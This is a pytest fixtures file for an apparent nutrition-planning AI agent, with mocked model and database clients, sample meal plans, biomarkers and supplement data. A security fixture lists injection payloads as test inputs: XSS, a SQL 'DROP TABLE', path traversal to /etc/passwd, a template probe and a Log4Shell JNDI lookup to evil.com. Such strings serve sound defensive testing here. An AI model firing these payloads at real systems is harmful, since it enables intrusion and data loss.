"""
Comprehensive test fixtures for Precision Nutrition Architect Agent.
Provides all necessary fixtures for A+ testing standards.
"""

import pytest
import asyncio
import json
from datetime import datetime, timedelta
from typing import Dict, Any, Optional
from unittest.mock import Mock, AsyncMock, MagicMock
import tempfile
import os

# Import agent components
from agents.precision_nutrition_architect.core.dependencies import (
    NutritionAgentDependencies,
)
from agents.precision_nutrition_architect.core.config import NutritionConfig
from agents.precision_nutrition_architect.core.exceptions import *
from agents.precision_nutrition_architect.skills_manager import NutritionSkillsManager
from agents.precision_nutrition_architect.services.nutrition_security_service import (
    NutritionSecurityService,
)
from agents.precision_nutrition_architect.services.nutrition_data_service import (
    NutritionDataService,
)
from agents.precision_nutrition_architect.services.nutrition_integration_service import (
    NutritionIntegrationService,
)

# Test configuration
from core.personality.personality_adapter import PersonalityAdapter
from clients.vertex_ai.vertex_ai_client import VertexAIClient
from core.cache_strategies import InMemoryCache


@pytest.fixture(scope="session")
def event_loop():
    """Create event loop for async tests."""
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
def nutrition_config():
    """Standard nutrition configuration for testing."""
    config = NutritionConfig(
        max_response_time=10.0,
        enable_health_data_encryption=True,
        enable_audit_logging=True,
        cache_meal_plans=True,
        cache_ttl_seconds=300,
        enable_chrononutrition=True,
        enable_genetic_optimization=False,  # Disabled for testing
        gdpr_compliant=True,
        hipaa_compliant=True,
    )
    return config


@pytest.fixture
def mock_gemini_client():
    """Mock Gemini client for testing."""
    mock_client = AsyncMock(spec=VertexAIClient)

    # Standard responses for different skills
    mock_client.generate_content_async.return_value = json.dumps(
        {
            "meal_plan": {
                "day_1": {
                    "breakfast": {"name": "Oatmeal with berries", "calories": 350},
                    "lunch": {"name": "Grilled chicken salad", "calories": 450},
                    "dinner": {"name": "Salmon with vegetables", "calories": 500},
                }
            },
            "total_calories": 1300,
            "macros": {"protein": 120, "carbs": 150, "fat": 45},
        }
    )

    # Image analysis response
    mock_client.analyze_image = AsyncMock(
        return_value=json.dumps(
            {
                "foods_identified": ["chicken breast", "brown rice", "broccoli"],
                "estimated_calories": 520,
                "nutrition_score": 8.5,
                "portion_accuracy": "high",
            }
        )
    )

    return mock_client


@pytest.fixture
def mock_personality_adapter():
    """Mock personality adapter for testing."""
    mock_adapter = AsyncMock(spec=PersonalityAdapter)

    mock_adapter.adapt_response.return_value = {
        "adapted_text": "Optimized nutrition plan for executive performance",
        "tone": "strategic",
        "confidence": 0.9,
    }

    return mock_adapter


@pytest.fixture
def mock_supabase_client():
    """Mock Supabase client for database operations."""
    mock_client = Mock()

    # Mock table operations
    mock_table = Mock()
    mock_table.insert.return_value.execute.return_value.data = [{"id": "test-id"}]
    mock_table.select.return_value.eq.return_value.single.return_value.execute.return_value.data = {
        "id": "test-id",
        "meal_plan": '{"test": "data"}',
        "created_at": datetime.now().isoformat(),
    }

    mock_client.table.return_value = mock_table
    return mock_client


@pytest.fixture
def mock_cache():
    """Mock cache for testing."""
    cache = InMemoryCache(max_size=100, ttl=300)
    return cache


@pytest.fixture
def test_dependencies(
    nutrition_config,
    mock_gemini_client,
    mock_personality_adapter,
    mock_supabase_client,
    mock_cache,
):
    """Create test dependencies with mocks."""
    deps = NutritionAgentDependencies.create_for_testing(
        personality_adapter=mock_personality_adapter,
        vertex_ai_client=mock_gemini_client,
        supabase_client=mock_supabase_client,
        cache=mock_cache,
    )
    return deps


@pytest.fixture
def nutrition_skills_manager(test_dependencies):
    """Create skills manager for testing."""
    return NutritionSkillsManager(test_dependencies)


@pytest.fixture
def security_service(nutrition_config):
    """Create security service for testing."""
    return NutritionSecurityService(nutrition_config)


@pytest.fixture
def data_service(mock_supabase_client, mock_cache, nutrition_config):
    """Create data service for testing."""
    return NutritionDataService(mock_supabase_client, mock_cache, nutrition_config)


@pytest.fixture
def integration_service(nutrition_config):
    """Create integration service for testing."""
    return NutritionIntegrationService(None, nutrition_config)


# Test data fixtures
@pytest.fixture
def sample_user_context():
    """Sample user context for testing."""
    return {
        "user_id": "test-user-123",
        "age": 35,
        "gender": "male",
        "weight": 80,
        "height": 180,
        "activity_level": "moderately_active",
        "goals": ["weight_loss", "muscle_gain"],
        "dietary_restrictions": ["gluten_free"],
        "food_preferences": {"cuisines": ["mediterranean", "asian"]},
        "program_type": "PRIME",
    }


@pytest.fixture
def sample_biomarkers():
    """Sample biomarker data for testing."""
    return {
        "glucose_fasting": 92,
        "hba1c": 5.2,
        "cholesterol_total": 185,
        "hdl": 65,
        "ldl": 105,
        "triglycerides": 88,
        "vitamin_d": 42,
        "b12": 650,
        "test_date": "2025-06-01",
    }


@pytest.fixture
def sample_meal_plan():
    """Sample meal plan for testing."""
    return {
        "plan_id": "test-plan-123",
        "duration_days": 7,
        "total_calories": 2200,
        "meals": {
            "day_1": {
                "breakfast": {
                    "name": "Greek yogurt with berries",
                    "calories": 350,
                    "macros": {"protein": 25, "carbs": 35, "fat": 12},
                },
                "lunch": {
                    "name": "Quinoa Buddha bowl",
                    "calories": 520,
                    "macros": {"protein": 22, "carbs": 65, "fat": 18},
                },
                "dinner": {
                    "name": "Grilled salmon with vegetables",
                    "calories": 450,
                    "macros": {"protein": 35, "carbs": 25, "fat": 22},
                },
            }
        },
        "shopping_list": ["greek yogurt", "berries", "quinoa", "salmon"],
        "prep_instructions": ["Prepare quinoa in advance", "Marinate salmon"],
    }


@pytest.fixture
def sample_food_items():
    """Sample food database items for testing."""
    return [
        {
            "name": "Chicken breast",
            "serving_size": 100,
            "serving_unit": "g",
            "calories": 165,
            "macros": {"protein": 31, "carbohydrates": 0, "fat": 3.6, "fiber": 0},
            "source": "usda",
        },
        {
            "name": "Brown rice",
            "serving_size": 100,
            "serving_unit": "g",
            "calories": 112,
            "macros": {"protein": 2.6, "carbohydrates": 23, "fat": 0.9, "fiber": 1.8},
            "source": "usda",
        },
    ]


@pytest.fixture
def sample_image_data():
    """Sample image data for testing."""
    # Create a small test image file
    with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as f:
        # Write minimal JPEG header
        f.write(
            b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xff\xdb"
        )
        temp_path = f.name

    yield {"path": temp_path, "format": "jpeg", "size": os.path.getsize(temp_path)}

    # Cleanup
    try:
        os.unlink(temp_path)
    except Exception:
        pass


@pytest.fixture
def sample_supplement_recommendations():
    """Sample supplement recommendations for testing."""
    return {
        "recommendations": [
            {
                "supplement": "Vitamin D3",
                "dosage": "2000 IU",
                "frequency": "daily",
                "priority": "high",
                "reason": "Low vitamin D levels detected",
                "duration": "3 months",
                "cost_estimate": 15.99,
            },
            {
                "supplement": "Omega-3",
                "dosage": "1000 mg EPA/DHA",
                "frequency": "daily",
                "priority": "medium",
                "reason": "Cardiovascular health optimization",
                "duration": "ongoing",
                "cost_estimate": 25.99,
            },
        ],
        "total_monthly_cost": 41.98,
        "interactions_checked": True,
        "safety_score": 9.2,
    }


# Performance testing fixtures
@pytest.fixture
def performance_test_data():
    """Data for performance testing."""
    return {
        "concurrent_users": 10,
        "requests_per_user": 20,
        "max_response_time": 5.0,
        "target_success_rate": 0.95,
    }


# Security testing fixtures
@pytest.fixture
def security_test_data():
    """Data for security testing."""
    return {
        "sensitive_pii": {
            "name": "John Doe",
            "email": "john@example.com",
            "ssn": "123-45-6789",
            "phone": "+1-555-0123",
        },
        "health_data": {
            "diagnosis": "Type 2 Diabetes",
            "medications": ["Metformin", "Lisinopril"],
            "allergies": ["Peanuts", "Shellfish"],
        },
        "malicious_inputs": [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
        ],
    }


# Utility fixtures
@pytest.fixture
def assert_response_structure():
    """Utility function to assert response structure."""

    def _assert_structure(response: Dict[str, Any], required_fields: list):
        """Assert that response has required structure."""
        assert isinstance(response, dict), "Response must be a dictionary"

        for field in required_fields:
            assert field in response, f"Required field '{field}' missing from response"

        if "success" in response:
            assert isinstance(
                response["success"], bool
            ), "Success field must be boolean"

        if "timestamp" in response or "generated_at" in response:
            timestamp_field = "timestamp" if "timestamp" in response else "generated_at"
            timestamp = response[timestamp_field]
            # Validate ISO format
            datetime.fromisoformat(timestamp.replace("Z", "+00:00"))

    return _assert_structure


@pytest.fixture
def assert_nutrition_data():
    """Utility function to assert nutrition data validity."""

    def _assert_nutrition_data(nutrition: Dict[str, Any]):
        """Assert nutrition data has valid structure and values."""
        required_fields = ["calories", "macros"]

        for field in required_fields:
            assert field in nutrition, f"Required nutrition field '{field}' missing"

        # Validate calories
        calories = nutrition["calories"]
        assert isinstance(calories, (int, float)), "Calories must be numeric"
        assert 0 <= calories <= 10000, "Calories must be reasonable (0-10000)"

        # Validate macros
        macros = nutrition["macros"]
        assert isinstance(macros, dict), "Macros must be a dictionary"

        required_macros = ["protein", "carbohydrates", "fat"]
        for macro in required_macros:
            assert macro in macros, f"Required macro '{macro}' missing"
            value = macros[macro]
            assert isinstance(value, (int, float)), f"{macro} must be numeric"
            assert value >= 0, f"{macro} cannot be negative"

    return _assert_nutrition_data


@pytest.fixture
def mock_circuit_breaker():
    """Mock circuit breaker for testing."""
    mock_breaker = AsyncMock()
    mock_breaker.call.side_effect = lambda func, *args, **kwargs: func(*args, **kwargs)
    mock_breaker.state = "CLOSED"
    return mock_breaker


# Cleanup fixture
@pytest.fixture(autouse=True)
def cleanup_test_files():
    """Cleanup any test files created during testing."""
    created_files = []

    yield created_files

    # Cleanup
    for file_path in created_files:
        try:
            if os.path.exists(file_path):
                os.unlink(file_path)
        except Exception as e:
            print(f"Warning: Could not cleanup test file {file_path}: {e}")
